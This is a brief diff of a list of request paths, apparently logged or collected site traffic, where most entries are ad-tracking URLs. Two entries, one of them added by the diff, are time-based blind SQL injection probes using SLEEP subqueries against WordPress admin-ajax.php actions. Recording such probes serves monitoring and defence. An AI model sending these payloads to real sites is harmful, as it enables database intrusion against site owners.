@@ -9651,3 +9651,4 @@ a
 /?gad_source=5&gclid=EAIaIQobChMIipD_vv3kigMV4o6sAh0blzzyEAEYASAAEgKKkPD_BwE
 /wp-admin/admin-ajax.php?meta_ids=1+AND+(SELECT+3066+FROM+(SELECT(SLEEP(6)))CEHy)&action=remove_post_meta_condition
 /?gad_source=5&gclid=EAIaIQobChMI0NnFo4TligMVuXKdCR3U-A99EAEYASAAEgL7NPD_BwE
+/wp-admin/admin-ajax.php?action=get_monthly_timetable&month=1+AND+(SELECT+6881+FROM+(SELECT(SLEEP(6)))iEAn)
